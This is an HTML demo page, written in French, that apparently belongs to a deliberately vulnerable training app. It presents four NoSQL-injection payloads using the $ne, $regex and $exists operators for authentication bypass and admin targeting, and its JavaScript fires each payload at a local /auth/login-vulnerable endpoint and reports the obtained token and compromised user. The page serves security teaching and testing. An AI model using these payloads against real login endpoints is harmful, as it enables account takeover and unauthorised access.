<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üö® Test de Vuln√©rabilit√© NoSQL</title>
    <link rel="stylesheet" href="/css/style.css">
    <style>
        .exploit-container {
            background: #2d1b1b;
            border: 2px solid #ff4757;
            border-radius: 10px;
            margin: 20px 0;
            padding: 20px;
        }
        .exploit-title {
            color: #ff4757;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .code-block {
            background: #1e1e1e;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            color: #f8f8f2;
            overflow-x: auto;
        }
        .warning {
            background: #ff6b35;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            text-align: center;
            font-weight: bold;
        }
        .success {
            background: #2ed573;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .error {
            background: #ff4757;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .test-button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px 0;
            font-weight: bold;
        }
        .test-button:hover {
            background: #ff3838;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="nav-container">
                <div class="logo">
                    <span class="logo-icon">üö®</span>
                    <span class="logo-text">Test de Vuln√©rabilit√© NoSQL</span>
                </div>
                <nav class="nav">
                    <a href="/dashboard.html" class="nav-link">‚Üê Retour Dashboard</a>
                </nav>
            </div>
        </header>

        <main class="main">
            <div class="warning">
                ‚ö†Ô∏è ATTENTION: Cette page d√©montre des vuln√©rabilit√©s de s√©curit√© √† des fins √©ducatives uniquement!
            </div>

            <div class="section">
                <h2>üîç Test d'Injection NoSQL</h2>
                <p>Cette page d√©montre comment exploiter l'endpoint vuln√©rable <code>/auth/login-vulnerable</code></p>
            </div>

            <!-- Test 1: Authentication Bypass -->
            <div class="exploit-container">
                <div class="exploit-title">üíÄ Exploit #1: Contournement d'authentification</div>
                <p>Cet exploit utilise l'op√©rateur MongoDB <code>$ne</code> (not equal) pour contourner la v√©rification des identifiants.</p>
                
                <div class="code-block">
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}
                </div>
                
                <button class="test-button" onclick="testAuthBypass()">üöÄ Tester l'Exploit</button>
                <div id="result1"></div>
            </div>

            <!-- Test 2: Specific User Target -->
            <div class="exploit-container">
                <div class="exploit-title">üéØ Exploit #2: Ciblage d'utilisateur sp√©cifique</div>
                <p>Cet exploit cible un utilisateur sp√©cifique en contournant le mot de passe.</p>
                
                <div class="code-block">
{
  "email": "admin@test.com",
  "password": {"$ne": null}
}
                </div>
                
                <button class="test-button" onclick="testTargetedAttack()">üöÄ Tester l'Exploit</button>
                <div id="result2"></div>
            </div>

            <!-- Test 3: Role-based attack -->
            <div class="exploit-container">
                <div class="exploit-title">üëë Exploit #3: Attaque bas√©e sur les r√¥les</div>
                <p>Cet exploit utilise une regex pour cibler les utilisateurs avec des r√¥les administratifs.</p>
                
                <div class="code-block">
{
  "email": {"$regex": "admin"},
  "password": {"$ne": null}
}
                </div>
                
                <button class="test-button" onclick="testRoleBasedAttack()">üöÄ Tester l'Exploit</button>
                <div id="result3"></div>
            </div>

            <!-- Test 4: Data Extraction -->
            <div class="exploit-container">
                <div class="exploit-title">üìä Exploit #4: Extraction de donn√©es</div>
                <p>Cet exploit utilise des conditions pour extraire des informations sur les utilisateurs.</p>
                
                <div class="code-block">
{
  "email": {"$exists": true},
  "password": {"$ne": null}
}
                </div>
                
                <button class="test-button" onclick="testDataExtraction()">üöÄ Tester l'Exploit</button>
                <div id="result4"></div>
            </div>

            <div class="section">
                <h3>üìã Journal des Exploits</h3>
                <div id="exploitLog" class="code-block" style="max-height: 300px; overflow-y: auto;">
                    # Journal des tests d'exploitation NoSQL
                </div>
            </div>
        </main>
    </div>

    <script>
        // Configuration de l'API
        const API_BASE = window.location.origin;
        
        // Logger pour afficher les r√©sultats
        function log(message, type = 'info') {
            const logElement = document.getElementById('exploitLog');
            const timestamp = new Date().toLocaleTimeString();
            const logLine = `[${timestamp}] ${message}\n`;
            logElement.textContent += logLine;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // Fonction pour afficher les r√©sultats
        function displayResult(elementId, success, data, exploit) {
            const element = document.getElementById(elementId);
            if (success) {
                element.innerHTML = `
                    <div class="success">
                        ‚úÖ Exploit r√©ussi! Token obtenu: ${data.access_token ? data.access_token.substring(0, 20) + '...' : 'N/A'}
                        <br>Utilisateur compromis: ${data.user ? data.user.email : 'N/A'} (${data.user ? data.user.role : 'N/A'})
                    </div>
                `;
                log(`‚úÖ SUCC√àS - ${exploit}: ${data.user ? data.user.email : 'Utilisateur inconnu'} compromis`);
            } else {
                element.innerHTML = `<div class="error">‚ùå Exploit √©chou√©: ${data.message || 'Erreur inconnue'}</div>`;
                log(`‚ùå √âCHEC - ${exploit}: ${data.message || 'Erreur inconnue'}`);
            }
        }

        // Test 1: Authentication Bypass
        async function testAuthBypass() {
            log('üöÄ Tentative d\'exploit: Contournement d\'authentification...');
            try {
                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: {"$ne": null},
                        password: {"$ne": null}
                    })
                });

                const data = await response.json();
                displayResult('result1', data.success, data, 'Contournement d\'authentification');
            } catch (error) {
                displayResult('result1', false, {message: error.message}, 'Contournement d\'authentification');
            }
        }

        // Test 2: Targeted Attack
        async function testTargetedAttack() {
            log('üöÄ Tentative d\'exploit: Attaque cibl√©e sur admin@test.com...');
            try {
                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: "admin@test.com",
                        password: {"$ne": null}
                    })
                });

                const data = await response.json();
                displayResult('result2', data.success, data, 'Attaque cibl√©e');
            } catch (error) {
                displayResult('result2', false, {message: error.message}, 'Attaque cibl√©e');
            }
        }

        // Test 3: Role-based Attack
        async function testRoleBasedAttack() {
            log('üöÄ Tentative d\'exploit: Attaque bas√©e sur les r√¥les admin...');
            try {
                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: {"$regex": "admin"},
                        password: {"$ne": null}
                    })
                });

                const data = await response.json();
                displayResult('result3', data.success, data, 'Attaque par r√¥les');
            } catch (error) {
                displayResult('result3', false, {message: error.message}, 'Attaque par r√¥les');
            }
        }

        // Test 4: Data Extraction
        async function testDataExtraction() {
            log('üöÄ Tentative d\'exploit: Extraction de donn√©es utilisateur...');
            try {
                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: {"$exists": true},
                        password: {"$ne": null}
                    })
                });

                const data = await response.json();
                displayResult('result4', data.success, data, 'Extraction de donn√©es');
            } catch (error) {
                displayResult('result4', false, {message: error.message}, 'Extraction de donn√©es');
            }
        }

        // Initialisation
        document.addEventListener('DOMContentLoaded', function() {
            log('üîç Page de test de vuln√©rabilit√©s NoSQL charg√©e');
            log('‚ö†Ô∏è  Endpoint vuln√©rable: /auth/login-vulnerable');
            log('üìç Tests disponibles: 4 exploits diff√©rents');
        });
    </script>
</body>
</html> 